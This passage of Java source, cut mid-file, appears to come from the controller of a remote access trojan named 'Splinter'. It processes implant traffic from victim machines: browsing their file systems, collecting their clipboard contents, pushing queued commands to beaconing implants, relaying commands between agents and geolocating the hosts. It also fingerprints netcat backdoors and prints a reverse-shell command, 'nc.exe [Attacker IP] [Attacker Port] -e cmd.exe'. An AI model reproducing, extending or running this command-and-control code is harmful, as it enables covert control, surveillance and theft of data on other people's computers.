						myFileBrowser.processUpdateInterrupt = false;
						myFileBrowser.updateFileRoots = false;
						myFileBrowser.updateFileList = false;
						
						
						
						
						return true;
					}
					
					//
					//NEW FILE ROOT
					//
					else if(arrcmd[1].equals(Driver.FILE_BROWSER_FILE_ROOTS))
					{
						
						
						arrObjectData = arrcmd[2].split(Driver.delimeter_2);										
						
						//if it errors out, skip this object
						fle__isDrive 					=  arrObjectData[0];
						fle__fle 						=  arrObjectData[1];
						fle__driveDisplayName			=  arrObjectData[2];
						fle__isFileSystem				=  arrObjectData[3];
						fle__isFloppy					=  arrObjectData[4];
						fle__isDirectory				=  arrObjectData[5];
						fle__isFile						=  arrObjectData[6];
						fle__isHidden					=  arrObjectData[7];
						fle__isTraversable				=  arrObjectData[8];
						fle__canRead					=  arrObjectData[9];
						fle__canWrite					=  arrObjectData[10];
						fle__canExecute					=  arrObjectData[11];
						fle__fullPath					=  arrObjectData[12];
						fle__parentDirectory			=  arrObjectData[13];
						fle__dateLastModified_long		=  arrObjectData[14];
						fle__totalSpace					=  arrObjectData[15];
						fle__usableSpace				=  arrObjectData[16];
						fle__Size						=  arrObjectData[17];
						fle__upDirectory				=  arrObjectData[18];
						//Create the Object Node
						objFileBrowser = new Object_FileBrowser(fle__isDrive, fle__fle, fle__driveDisplayName, fle__isFileSystem, fle__isFloppy, fle__isDirectory, fle__isFile, fle__isHidden, fle__isTraversable, fle__canRead, fle__canWrite, fle__canExecute, fle__fullPath, fle__parentDirectory, fle__dateLastModified_long, fle__totalSpace, fle__usableSpace, fle__Size, fle__upDirectory);
																							
						//TO LINK THE FILE!!!
						myFileBrowser.alNewFileRoots.add(objFileBrowser);
						
						//check to save the default loading directory
						if(objFileBrowser.myFile_fle != null && objFileBrowser.myFile_fle.trim().equalsIgnoreCase("C:\\"))
						{
							objStartingFileDirectory = objFileBrowser;
						}
						
						
						return true;
					}
					
					//
					//END FILE ROOT
					//
					else if(arrcmd[1].equals(Driver.END_FILE_BROWSER_FILE_ROOTS))
					{
						//end receiving new file root, transfer the list
						try{myFileBrowser.alCurrFileList.clear();}catch(Exception e){}
						try{myFileBrowser.alCurrFileRoots.clear();}catch(Exception e){}
						
						for(int i = 0; i < myFileBrowser.alNewFileRoots.size(); i++)
						{
							//Add to current File Root
							myFileBrowser.alCurrFileRoots.add(myFileBrowser.alNewFileRoots.get(i));		
							myFileBrowser.alCurrFileRoots.get(i).myIndexInArrayList = i;
						}
						
						//Show the Frame
						myFileBrowser.setVisible(true);
						
						//enable the interrupt to update
						myFileBrowser.processUpdateInterrupt = true;
						myFileBrowser.updateFileRoots = true;
						
						
					}
					
					
					
					/***********************************************************************
					 * 
					 * 
					 * FILE LIST (SINGLE FILE OR DIRECTORY) FROM REMOTE SYSTEM
					 * 
					 * * * * POTENTIAL BUFFER OVERFLOW * * * i don't do any validation on input or how much we receive!
					 * 
					 * This is the expected procedure: 
					 *  --->> BEGIN_FILE_BROWSER_FILE_ROOTS: marks the beginning of a new file root system, upon receiving this, remove all entries in the new arraylist, and store the new system in the following received lines
					 * ---->> FILE_BROWSER_FILE_ROOTS: marks a new file root coming in, break off the demiter, create a new file object node, and store in alNewFileRoot
					 * ---->> END_FILE_BROWSER_FILE_ROOTS: this states we have finished reading the File roots, convert the new arraylist over to current arraylist, and display the frame
					 * 
					 * 
					 * 
					 * 
					 * 
					 * 
					 *************************************************************************/
					//
					//SIMPLE FILE BROWSER MESSAGE FOR THE USER IN THE CONSOLE OUT
					//
					else if(arrcmd[1].equals(Driver.FILE_BROWSER_MESSAGE))
					{
						try
						{
							if(this.myFileBrowser != null && !this.frameFileBrowserIsDisposed)
							{
								myFileBrowser.jtxtpne_ConsoleOut.appendString(true, ""+myThread_ID, arrcmd[2], Drivers.clrImplant, Drivers.clrBackground);
							}
							else
							{
								this.postResponse("FILE BROWSER: " + arrcmd[2]);
							}	
						}
						catch(Exception e){}//it was prolly a blank line, so ignore it
						
					}
					
					//
					//BEGIN FILE LIST OBJECT!!!
					//
					else if(arrcmd[1].equals(Driver.BEGIN_FILE_BROWSER_FILE_LIST))
					{
						//do nothing if the frame is disposed
						if(this.myFileBrowser == null || this.frameFileBrowserIsDisposed)
						{
							return false;
						}
						
						//otherwise, assume the frame is up, post!
						try{	myFileBrowser.alNewFileList.clear();		}catch(Exception e){}
						
						try{	myFileBrowser.jcbFileName.removeAllItems();	 myFileBrowser.jcbFileName.addItem("");}catch(Exception ee){}
						
						try{	myFileBrowser.jcbCurrentDirectoryFilter.removeAllItems();	 myFileBrowser.jcbCurrentDirectoryFilter.addItem("");}catch(Exception eee){}
						
						myFileBrowser.processUpdateInterrupt = false;
						myFileBrowser.updateFileList = false;
					}
					
					//
					//SAVE FILE LIST OBJECT!!!
					//
					else if(arrcmd[1].equals(Driver.FILE_BROWSER_FILE_LIST))
					{
						//do nothing if the frame is disposed
						if(this.myFileBrowser == null || this.frameFileBrowserIsDisposed)
						{
							return false;
						}
						
						//indicate we're receiving
						if(!myFileBrowser.jtblFileBrowser.jlblUpdatingList.isVisible())
						{
							myFileBrowser.jtblFileBrowser.jlblUpdatingList.setVisible(true);
						}
						
						//OTHERWISE, frame is up, save the object!
						
						arrObjectData = arrcmd[2].split(Driver.delimeter_2);										
						
						//if it errors out, skip this object
						fle__isDrive 					=  arrObjectData[0];
						fle__fle 						=  arrObjectData[1];
						fle__driveDisplayName			=  arrObjectData[2];
						fle__isFileSystem				=  arrObjectData[3];
						fle__isFloppy					=  arrObjectData[4];
						fle__isDirectory				=  arrObjectData[5];
						fle__isFile						=  arrObjectData[6];
						fle__isHidden					=  arrObjectData[7];
						fle__isTraversable				=  arrObjectData[8];
						fle__canRead					=  arrObjectData[9];
						fle__canWrite					=  arrObjectData[10];
						fle__canExecute					=  arrObjectData[11];
						fle__fullPath					=  arrObjectData[12];
						fle__parentDirectory			=  arrObjectData[13];
						fle__dateLastModified_long		=  arrObjectData[14];
						fle__totalSpace					=  arrObjectData[15];
						fle__usableSpace				=  arrObjectData[16];
						fle__Size						=  arrObjectData[17];
						fle__upDirectory				=  arrObjectData[18];
						
						//Create the Object Node
						objFileBrowser = new Object_FileBrowser(fle__isDrive, fle__fle, fle__driveDisplayName, fle__isFileSystem, fle__isFloppy, fle__isDirectory, fle__isFile, fle__isHidden, fle__isTraversable, fle__canRead, fle__canWrite, fle__canExecute, fle__fullPath, fle__parentDirectory, fle__dateLastModified_long, fle__totalSpace, fle__usableSpace, fle__Size, fle__upDirectory);
																							
						//TO LINK THE FILE!!!
						myFileBrowser.alNewFileList.add(objFileBrowser);	
						
						//add to the file shortcut jcombobox
						try	
						{	
							if(objFileBrowser.i_am_a_file)
							{
								myFileBrowser.jcbFileName.addItem(fle__fullPath);
								
								String extension = "";
								boolean found = false;
								for(int i = 0; i < myFileBrowser.jcbCurrentDirectoryFilter.getItemCount(); i++)
								{
									extension = (String)myFileBrowser.jcbCurrentDirectoryFilter.getItemAt(i);
									
									if(extension != null && (extension.equalsIgnoreCase(objFileBrowser.myFileExtension_withoutPeriod) || objFileBrowser.myFileExtension_withoutPeriod.trim().equals("-")))
									{										
										found = true;
										break;
									}
									
								}
								
								if(!found)
								{
									//add the new extension
									myFileBrowser.jcbCurrentDirectoryFilter.addItem(objFileBrowser.myFileExtension_withoutPeriod);
								}
									
								
							}
						}catch(Exception eee){}
						
					}					
						
					//
					//END FILE LIST
					//
					else if(arrcmd[1].equals(Driver.END_FILE_BROWSER_FILE_LIST))
					{
						//end receiving new file list, transfer to the current list
						try{myFileBrowser.alCurrFileList.clear();}catch(Exception e){}
												
						for(int i = 0; i < myFileBrowser.alNewFileList.size(); i++)
						{
							//Add to current File Root
							myFileBrowser.alCurrFileList.add(myFileBrowser.alNewFileList.get(i));		
							myFileBrowser.alCurrFileList.get(i).myIndexInArrayList = i;
						}
																		
						//enable the interrupt to update
						myFileBrowser.processUpdateInterrupt = true;
						myFileBrowser.updateFileList = true;	
						
						myFileBrowser.jtblFileBrowser.jlblUpdatingList.setVisible(false);
						
						
					}
					
					//
					//EMPTY DIRECTORY SPECIFIED
					//
					else if(arrcmd[1].equals(Driver.FILE_BROWSER_EMPTY_DIRECTORY))
					{
						//[0] == unique delimiter
						//[1] == FILE_BROWSER_EMPTY_DIRECTORY
						//[2] == directory full path
						//[3] == directory object tokens
						
						//end receiving new file list, transfer to the current list
						try{myFileBrowser.alCurrFileList.clear();}catch(Exception e){}
												
						//allow the interrupt to handle removal of all file objects and to show the new label
						myFileBrowser.emptyDirectoryPath_only_used_if_alCurrFileList_is_empty = arrcmd[2];
						
						//take the directory attributes
						arrObjectData = arrcmd[3].split(Driver.delimeter_2);										
						
						//if it errors out, skip this object
						fle__isDrive 					=  arrObjectData[0];
						fle__fle 						=  arrObjectData[1];
						fle__driveDisplayName			=  arrObjectData[2];
						fle__isFileSystem				=  arrObjectData[3];
						fle__isFloppy					=  arrObjectData[4];
						fle__isDirectory				=  arrObjectData[5];
						fle__isFile						=  arrObjectData[6];
						fle__isHidden					=  arrObjectData[7];
						fle__isTraversable				=  arrObjectData[8];
						fle__canRead					=  arrObjectData[9];
						fle__canWrite					=  arrObjectData[10];
						fle__canExecute					=  arrObjectData[11];
						fle__fullPath					=  arrObjectData[12];
						fle__parentDirectory			=  arrObjectData[13];
						fle__dateLastModified_long		=  arrObjectData[14];
						fle__totalSpace					=  arrObjectData[15];
						fle__usableSpace				=  arrObjectData[16];
						fle__Size						=  arrObjectData[17];
						fle__upDirectory				=  arrObjectData[18];
						
						//Create the Object Node
						objFileBrowser = new Object_FileBrowser(fle__isDrive, fle__fle, fle__driveDisplayName, fle__isFileSystem, fle__isFloppy, fle__isDirectory, fle__isFile, fle__isHidden, fle__isTraversable, fle__canRead, fle__canWrite, fle__canExecute, fle__fullPath, fle__parentDirectory, fle__dateLastModified_long, fle__totalSpace, fle__usableSpace, fle__Size, fle__upDirectory);
																							
						//TO LINK THE FILE!!!
						//myFileBrowser.alCurrFileList.add(objFileBrowser);	
						myFileBrowser.objFileBrowser_EmptyDirectory = objFileBrowser;
						
						//enable the interrupt to update
						myFileBrowser.processUpdateInterrupt = true;
						myFileBrowser.updateFileList = true;	
						
						myFileBrowser.jtblFileBrowser.jlblUpdatingList.setVisible(false);
						
						
					}
					
					
					/***********************************************************************
					 * 
					 * EXTRACT CLIPBOARD CONTENTS
					 * 
					 * 
					 *************************************************************************/
					//
					//SIMPLE FILE BROWSER MESSAGE FOR THE USER IN THE CONSOLE OUT
					//
					else if(arrcmd[1].equals(Driver.RESPONSE_CLIPBOARD))
					{
						//[1] == response
						//[2] == data
						
						//check for errors first:
						if(arrcmd[2].equalsIgnoreCase(Driver.NO_TEXT_RESPONSE_CLIPBOARD_ERROR))
						{
							//solo, i have found this error as a result of 2 or more implant instances running on the same box and both are trying to access the clipboard
							//one succeeds, but the other fails, so when we see this error, cancel it!
							
							Drivers.txtpne_broadcastMessageBoard.appendString(true, ""+myThread_ID, "CONTROLLER MESSAGE: Note, I have detected an error from this agent interacting with host system's clipboard. Sending clipboard kill command now...", Drivers.clrBackground, Drivers.clrForeground );							
							this.sendCommand_RAW(Driver.DISABLE_CLIPBOARD_EXTRACTOR);
							
							
						}
						else//display the text as normal
						{
							Drivers.txtpne_broadcastMessageBoard.appendString(true, ""+myThread_ID, "CLIPBOARD: \"" + arrcmd[2] + "\"", Drivers.clrForeground, Drivers.clrBackground);
						}
					}
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					/****************************************************************************
					 * 
					 * OTHERWISE, NOT SURE....... DISPLAY IT ON THE CONTROLLER
					 * 
					 * 
					 ***************************************************************************/
					else
					{
						//ensure we're not receiving a registration command
						if(line.trim().startsWith(Driver.CONTROLLER_INITIAL_REGISTRATION))
						{
							//DISMISS THIS REGISTRATION, WE SHOULD ALREADY HAVE THE INFORMATION WE REQUIRE...
							//Driver.sop("\nTISK!!!!  Looks like you connected the controller into itself ah?????\n");
							return true;
						}
						
						this.postResponse("UNK CMD: " + line);
					}
					
					
				}//end try
				catch(Exception e)
				{
					this.postResponse(line);
				}
				
				
				
			}
			
			return true;
			
		}
		catch(ArrayIndexOutOfBoundsException aioeb)
		{
			//Drivers.eop("determineCommand", strMyClassName, aioeb, aioeb.getLocalizedMessage(), false);
			Drivers.sop("Tisk Tisk!!!!  Missed it by that much. Authentication failed for this implant in determineCommand... invalid parameters/command passed in");
		}
		catch(Exception e)
		{
			//Drivers.eop("determineCommand", strMyClassName, e, e.getLocalizedMessage(), false);
			Drivers.sop("Geez!!!!  Missed it by that much. Authentication failed for this implant in determineCommand... invalid parameters/command passed in");
		}
		
		this.myIMPLANT_ID = Driver.IMPLANT_ID_UNKNOWN;
		try{this.myImplantName = Driver.ARR_IMPLANT_NAME[myIMPLANT_ID];}catch(Exception e){this.myImplantName = "UNKNOWN";}
		
		
		return false;
	}
	
	public boolean processBeaconCheckin(String fullCmdLine)
	{
		try
		{						
			String []arrCmd = fullCmdLine.split(Driver.delimeter_1);
			String agentConfirmationID = ""+myRandomIdentifier;
			
			if(arrCmd == null || arrCmd.length < 2)
			{
				Driver.sop("\n\nNOTE: AGENT CONFIRMATION ID NOT RECEIVED FOR Thread: " + this.getThreadID());
			}
			else//we have the confirmation index value
			{
				agentConfirmationID = arrCmd[1];
				myReceivedConfirmationID_From_Implant = arrCmd[1];
				//Driver.sop("\n\nCONFIRMATION: " + myReceivedConfirmationID_From_Implant + "\n\n");
			}
			
			//
			//REMOVE DUPLICATE ENTRY OF BEACONING AGENT IF APPLICABLE
			//at this point, all new agents are added to the JTable for Beaconing Implants, if we have already seen this agent, i.e. if agent confirmation does not match myRandomIdentifier, then this is a beaconing system that has already registered with Splinter, so remove this current connection from the JTable (because the other one is still there!
			//
			if(!agentConfirmationID.trim().equalsIgnoreCase(agentConfirmationID.trim()))
			{
				//mismatch found, indicating this is a recurring connection. so remove this agent from the arraylist because the prev should still be there
				if(Driver.alBeaconTerminals.contains(this))
				{
					Driver.alBeaconTerminals.remove(this);
					//Drivers.updateConnectedImplants();
					Drivers.jtblBeaconImplants.updateJTable = true;
					
					Driver.sop(" * * * " + Driver.getTimeStamp_Without_Date() + " - Agent checkin received from: " + agentConfirmationID);					
				}
			}
			
			/*Thread_Terminal terminal = Driver.getBeaconThread(agentConfirmationID);
			if(terminal == null)
			{
				Driver.alBeaconTerminals.add(this);
				Drivers.jtblBeaconImplants.updateJTable = true;
			}*/
					
			//
			//Update Agent on Connections List
			//
			JPanel_BeaconCommand cmd = null;
			String command = "";
			int numCommandsSent = 0;
			for(int i = 0; i < Drivers.alBeaconCommands_GUI.size(); i++)
			{
				try
				{
					cmd = Drivers.alBeaconCommands_GUI.get(i);
					command = cmd.jtfCommand.getText().trim();
					
					if(cmd.jcbEnable.isSelected() && !command.equals(""))
					{
						//we have an enabled command that is valid, send to implant
						this.sendCommand_RAW(Driver.BEACON_EXECUTE_COMMAND + Driver.delimeter_1 + command);
						++numCommandsSent;
					}
				}
				catch(Exception e)
				{
					continue;
				}
				
			}
			
			this.sendCommand_RAW(Driver.BEACON_END_COMMAND_UPDATE);
			
			//
			//UPDATE CONTROLLER
			//
			if(myReceivedConfirmationID_From_Implant != null && !myReceivedConfirmationID_From_Implant.trim().equals(""))
			{
				this.myConfirmationID_Beacon = myReceivedConfirmationID_From_Implant;
			}
			
			this.updateBeaconConnectionTime(myReceivedConfirmationID_From_Implant);
			
			//
			//Notify Controller
			//
			if(numCommandsSent < 1)
			{
				Drivers.txtpne_BEACON_broadcastMessageBoard.appendString(true, ""+myThread_ID, "Agent checkin received from Agent ID: " + agentConfirmationID + ".  (0) commands sent to beacon implant...", Drivers.clrImplant, Drivers.clrBackground);
			}
			else if(numCommandsSent == 1)
			{
				Drivers.txtpne_BEACON_broadcastMessageBoard.appendString(true, ""+myThread_ID, "Agent checkin received from Agent ID: " + agentConfirmationID + " --> [" + numCommandsSent + "] command sent to beacon implant...", Drivers.clrImplant, Drivers.clrBackground);				
			}
			else
			{
				Drivers.txtpne_BEACON_broadcastMessageBoard.appendString(true, ""+myThread_ID, "Agent checkin received from Agent ID: " + agentConfirmationID + " --> [" + numCommandsSent + "] commands sent to beacon implant...", Drivers.clrImplant, Drivers.clrBackground);
			}
			
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("processBeaconCheckin", this.strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	public boolean relayMessage_BRIDGE(String msg)
	{
		try
		{
			//Driver.sop("1- in Thread_Terminal msg: " + msg);
			
			//now, need to search through the arraylist of all connections, and unless we have a controller connected, send the command to all
			if(/*relaybot_ServerSocket != null &&*/ Driver.alRelayTerminals != null && Driver.alRelayTerminals.size() > 0)
			{
				//search the arraylist, and send the command to the agents, and echo commands to controllers
				Thread_Terminal agent = null;
				
				//Driver.sop("2- in Thread_Terminal msg: " + msg);
				
				for(int i = 0; i < Driver.alRelayTerminals.size(); i++)
				{
					//never send the same command to self
					agent = Driver.alRelayTerminals.get(i);
					if(agent == this)
					{
						continue;
					}
					
					//agents do not relay their response to other agents!
					//Drivers.sop("solo, come to Thread_Terminal and add code if this is an implant to omit sending responses to other implants");
					
					//controllers do not send commands to other controllers, so let's echo the command here
					if(i_am_Controller_Agent && agent.i_am_Controller_Agent)
					{
						agent.sendCommand_RAW(Driver.RELAY_ECHO + Driver.delimeter_1 + myImplantName + Driver.delimeter_1 + getJListData() + Driver.delimeter_1 + myVictim_RHOST_IP + Driver.delimeter_1 + msg);
					}
					else
					{
						//Driver.sop("3- in Thread_Terminal sending agent command: " + msg);
						
						//here, we could create greater granularity and check the agent id's to send the command to specific agents, but for now, simply echo the command to all connected agents and relay bots
						agent.sendCommand_RAW(msg);
					}
				}
				
			}
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("relayMessage_BRIDGE", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	public boolean showMyselfOnMap()
	{
		try
		{
			if(this.myGEO_Latitude == null || this.myGEO_Latitude.trim().equals("") || this.myGEO_Longitude == null || this.myGEO_Longitude.trim().equals(""))
			{
				Drivers.jop_Error("Lat/Lon data not populated for this thread: " + this.getId(), "Unable to display map data");
				return false;
			}
			
			ShowMap meOnMap = new ShowMap(this);
			meOnMap.start();
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("showMyselfOnMap", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}

	private boolean acquireOverheadData(BufferedReader brSocket, PrintWriter pwSocket)
	{
		try
		{
			//NOTE: we will still have to determine if this is a windows or linux agent and modify calls accordingly
			
			acquireOverheadData_WINDOWS(brSocket, pwSocket);
			
			//Perform the GEO resolution on an "allow all, deny by exception" methodology in which we will geo-resolve all agents except certain ones, like beacon agents
			if(this.continueRun && !this.killThread && !this.I_am_Disconnected_From_Implant)
			{
				//AGENT IS STILL CONNECTED BY THIS TIME, only perform GEO action if not certain agents!
				if(!this.i_am_Beacon_Agent)
				{
					resolve_GEO_LOCATION();
					
					//update appropriate JTable after the geo location is complete
					/*try{Drivers.jtblConnectedImplants.updateJTable = true;}catch(Exception e){}
					Drivers.updateConnectedImplants();*/
				}
				
				
				
			}
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("acquireOverheadData", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean resolve_GEO_LOCATION()
	{
		try
		{
			if(Driver.enableGPS_Resolution)
			{
				myGeoLocation = new GeoThread(this);
				myGeoLocation.start();
			}
			else
			{
				this.myFullGeoData = "GPS Resolution Disabled";
			}
			
			geo_resolution_complete = true;
			
			return true;
		}
		
		catch(Exception e)
		{
			Driver.eop("resolve_GEO_LOCATION", strMyClassName, e, "", false);
		}
		
		geo_resolution_complete = true;
		
		return false;
	}
	
	/**
	   * 
	   * NOTE!!!!!!!!!!!!
	   * DO NOT CHANGE THE INTERROGATION ORDER FOR NETCAT
	   * IF YOU WANT TO ADD MORE COMMANDS, ADD IT AT THE END!!!!!
	   * 
	   * @param brSocket
	   * @param pwSocket
	   * @return
	   */
	private boolean acquireOverheadData_WINDOWS(BufferedReader brSocket, PrintWriter pwSocket)
	{
		dataAcquisitionComplete = true;
		String strFirstLine = "";
		
		try
		{
//Drivers.jop_Error("Solo",  "Old Version, need to handle hand shake! continue from here");
//clear to continue for now
//pwSocket.println("");
//return true;
			
			//NEED TO DETERMINE IMPLANT CONNECTED TO!
			Drivers.sop("\nAttempting to interrogate connected implant to determine agent type...");
			
			//For this to work, we expect the agent to return a line value indicating we are connected and such
			strFirstLine = brSocket.readLine();

			/**********************************************************************************************
	  		 * SPLINTER - LOGGING AGENT (LOGGIE)
	  		 *********************************************************************************************/
			if(strFirstLine != null && (strFirstLine.trim().startsWith(Driver.LOGGIE_AGENT_REGISTRATION)))
			{
	  			Driver.sop("Splinter LOGGING Agent registration started...");
				if(!determineCommand(strFirstLine))
				{
					//error on line received, thus display what we received on the main terminals
					throw new UnsupportedOperationException ("Unknown Agent Connected");
				}
				
				I_have_an_important_message = "";
				
				Driver.alLoggingAgents.add(this);
				//Drivers.updateLoggingAgents();
				Drivers.jtblLoggingAgents.updateJTable = true;
				
				dataAcquisitionComplete = true;
				
				return true;
			}
			
			/**********************************************************************************************
	  		 * SPLINTER - BEACON INITIAL REGISTRATION
	  		 *********************************************************************************************/
	  		if(strFirstLine != null && (strFirstLine.trim().startsWith(Driver.SPLINTER_BEACON_INITIAL_REGISTRATION) /*|| strFirstLine.trim().startsWith(myUniqueDelimeter)*/))
			{
	  			Driver.sop("Splinter BEACON Implant registration started...");
				if(!determineCommand(strFirstLine))
				{
					//error on line received, thus display what we received on the main terminals
					throw new UnsupportedOperationException ("Unknown Agent Connected");
				}

	  			//
	  			//REMOVE FROM ACTIVE CONNECTED TERMINALS
	  			//
	  			//instead of updating the jtables, this thread has already been added to the active arraylist of connections, so just remove it from that list and add to beacon jtable
				if(Drivers.alTerminals.contains(this))
				{
					//remove from active connections
					Drivers.alTerminals.remove(this);					
				}
				
				//
				//ADD TO BEACON JTABLE
				//
				//Driver.alBeaconTerminals.add(this);
				//Drivers.jtblBeaconImplants.addRow(this.getJTableRowData());
				
				this.updateBeaconConnectionTime(""+this.myRandomIdentifier);
					
				//
				//Send beacon confirmation to store it's registration value
				//
				//this.sendCommand_RAW(Driver.SET_IMPLANT_REGISTRATION + Driver.delimeter_1 + this.myRandomIdentifier);
				
				//Drivers.updateConnectedImplants();
				Drivers.jtblBeaconImplants.updateJTable = true;
				//Drivers.jtblDisconnectedImplants.updateJTable = true;
				
				
				dataAcquisitionComplete = true;
				return true;
				
			}
	  		
	  		/**********************************************************************************************
	  		 * SPLINTER - BEACON HEADER TO STATE MORE DATA I COMING
	  		 *********************************************************************************************/
	  		if(strFirstLine != null && (strFirstLine.trim().startsWith(Driver.SPLINTER_BEACON_RESPONSE_HEADER)))
			{
	  			i_am_Beacon_Agent = true;
	  			i_am_receiving_beacon_response = true;
	  			
	  			String temp = strFirstLine;
	  			
	  			myReceivedConfirmationID_From_Implant = temp.replace(Driver.SPLINTER_BEACON_RESPONSE_HEADER, "").trim();  		
	  			
	  			//
	  			//REMOVE FROM ACTIVE CONNECTED TERMINALS
	  			//
	  			//instead of updating the jtables, this thread has already been added to the active arraylist of connections, so just remove it from that list and add to beacon jtable
				if(Drivers.alTerminals.contains(this))
				{
					//remove from active connections
					Drivers.alTerminals.remove(this);					
				}
	  			
				//
				//Determine Command
				//
				if(!determineCommand(strFirstLine))
				{
					//error on line received, thus display what we received on the main terminals
					throw new UnsupportedOperationException ("Unknown Agent Connected");
				}

	  			
				
				//
				//ADD TO BEACON JTABLE
				//
				//Drivers.alBeaconTerminals.add(this);
				
				//
					
				//
				//Send beacon confirmation to store it's registration value
				//
				//this.sendCommand_RAW(Driver.SET_IMPLANT_REGISTRATION + Driver.delimeter_1 + this.myRandomIdentifier);
				
				this.updateBeaconConnectionTime(myReceivedConfirmationID_From_Implant);
				
				//Drivers.updateConnectedImplants();
				Drivers.jtblBeaconImplants.updateJTable = true;
				//Drivers.jtblDisconnectedImplants.updateJTable = true;
				
				
				dataAcquisitionComplete = true;
				return true;
				
			}
			
			/**********************************************************************************************
	  		 * SPLINTER - IMPLANT 
	  		 *********************************************************************************************/
	  		if(strFirstLine != null && (strFirstLine.trim().startsWith(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION) /*|| strFirstLine.trim().startsWith(myUniqueDelimeter)*/))
			{
	  			Driver.sop("Splinter Implant registration started...");
				if(!determineCommand(strFirstLine))
				{
					//error on line received, thus display what we received on the main terminals
					throw new UnsupportedOperationException ("Unknown Agent Connected");
				}

				else//we know the implant connected and have already handled the handshake
				{
					//add self to arraylist
					//Drivers.alTerminals.add(this);
					
					I_have_an_important_message = "";//clear the field to state we're done interrogating
					
					if(this.i_am_setup_as_relay)
					{
						//not sure what i want to do here just yet
					}
					else//otw, update connected agents as before				
					{
						Drivers.alTerminals.add(this);
						Drivers.updateConnectedImplants();
						Drivers.jtblConnectedImplants.updateJTable = true;
					}
					
					dataAcquisitionComplete = true;
					return true;
				}
			}
	  		
	  		/**********************************************************************************************
	  		 * SPLINTER - CONTROLLER 
	  		 *********************************************************************************************/
	  		if(strFirstLine != null && (strFirstLine.trim().startsWith(Driver.CONTROLLER_INITIAL_REGISTRATION))) 
			{	  			
				if(!determineCommand(strFirstLine))
				{
					//error on line received, thus display what we received on the main terminals
					throw new UnsupportedOperationException ("Unknown Agent Connected");
				}

				else//we know the implant connected and have already handled the handshake
				{
					//add self to arraylist
					//Drivers.alTerminals.add(this);
					
					I_have_an_important_message = "";//clear the field to state we're done interrogating

					if(this.i_am_setup_as_relay)
					{
						//not sure what i want to do here just yet
					}
					else//otw, update connected agents as before				
					{
						//add self to arraylist
						Drivers.alTerminals.add(this);
						
						Drivers.updateConnectedImplants();
						Drivers.jtblConnectedImplants.updateJTable = true;
					}
					
					dataAcquisitionComplete = true;
					return true;
				}
			}
	  		
	  		/**********************************************************************************************
	  		 * SPLINTER - RELAY BRIDGE 
	  		 *********************************************************************************************/
	  		if(strFirstLine != null && (strFirstLine.trim().startsWith(Driver.RELAY_INITIAL_REGISTRATION_BRIDGE))) 
			{	  			
				if(!determineCommand(strFirstLine))
				{
					//error on line received, thus display what we received on the main terminals
					throw new UnsupportedOperationException ("Unknown Agent Connected");
				}

				else//we know the implant connected and have already handled the handshake
				{
					//add self to arraylist
					//Drivers.alTerminals.add(this);
					
					I_have_an_important_message = "";//clear the field to state we're done interrogating

					if(this.i_am_setup_as_relay)
					{
						//not sure what i want to do here just yet
					}
					else//otw, update connected agents as before				
					{
						//add self to arraylist
						Drivers.alTerminals.add(this);
						
						Drivers.updateConnectedImplants();
						Drivers.jtblConnectedImplants.updateJTable = true;
					}
					
					dataAcquisitionComplete = true;
					return true;
				}
			}
	  		
	  		/**********************************************************************************************
	  		 * SPLINTER - RELAY PROXY 
	  		 *********************************************************************************************/
	  		if(strFirstLine != null && (strFirstLine.trim().startsWith(Driver.RELAY_INITIAL_REGISTRATION_PROXY))) 
			{	  			
				if(!determineCommand(strFirstLine))
				{
					//error on line received, thus display what we received on the main terminals
					throw new UnsupportedOperationException ("Unknown Agent Connected");
				}

				else//we know the implant connected and have already handled the handshake
				{
					//add self to arraylist
					//Drivers.alTerminals.add(this);
					
					I_have_an_important_message = "";//clear the field to state we're done interrogating

					if(this.i_am_setup_as_relay)
					{
						//not sure what i want to do here just yet
					}
					else//otw, update connected agents as before				
					{
						//add self to arraylist
						Drivers.alTerminals.add(this);
						
						Drivers.updateConnectedImplants();
						Drivers.jtblConnectedImplants.updateJTable = true;
					}
					
					dataAcquisitionComplete = true;
					return true;
				}
			}

			//check if the agent bindsd to cmd.exe command prompt on a windows machine
			if(strFirstLine != null && strFirstLine.contains(WINDOWS_COMMAND_PROMPT_HEADER_STRING))
			{
				//looks like we're connected to an implant bounded to cmd.exe terminal. 
				
				//NOTE: there are different versions of command prompt.  each returning a slightly different format. determine which command prompt version is applicable below				
		  		//Drivers.sop("First line contains search string: " + "\"" + WINDOWS_COMMAND_PROMPT_HEADER_STRING + "." + "- Which appears to match first line from a backdoor that binds to cmd.exe similar to executing the command: nc.exe [Attacker IP] [Attacker Port] -e cmd.exe." + " ##>Confidence level for netcat: 25% --> I am launching the netcat_windows subroutine to configure the environment...");
				Drivers.sop("-> Interesting. It appears I am connected to a backdoor that binds to cmd.exe similar to executing the command: nc.exe [Attacker IP] [Attacker Port] -e cmd.exe.  Perhaps this is a netcat implant" + " --> Confidence level for netcat: 25% --> I am launching the netcat_windows subroutine to configure the environment...");
		  			  		
		  		//read next line, should contain "Copyright (c) 2009 Microsoft Corporation.  All rights reserved." for the current version of cmd.exe or "(C) Copyright 1985-2000 Microsoft Corp." for the older version of command prompt. Read next line to determins
		  		String strSecondLine = brSocket.readLine();		      	
		      	
		  		
		      	/**********************************************************************************************
		      	 * NEWER CMD PROMPT VERSION "Copyright (c) 2009 Microsoft Corporation.  All rights reserved."
		      	 *********************************************************************************************/
		  		if(strSecondLine != null && strSecondLine.contains(NEWER_VERSION_OF_CMD_PROMPT_HEADER_STRING))
		      	{
		      		//yup, this appears to be netcat, the full line should actually be similar to this "Copyright (c) 2009 Microsoft Corporation.  All rights reserved."
		      		//Drivers.sop("Second line contains search string: " + "\"" + NEWER_VERSION_OF_CMD_PROMPT_HEADER_STRING + "\"." + "- Which appears to match the second line from netcat binding to cmd.exe stating \"Copyright (c) 2009 Microsoft Corporation.  All rights reserved. \"" + " ##>Confidence level for netcat: 50% --> I am skipping the next blank line");
		  			Drivers.sop("-->> This is good. It appears it is a netcat implant -->> Confidence level for netcat: 50% ...");
		      		
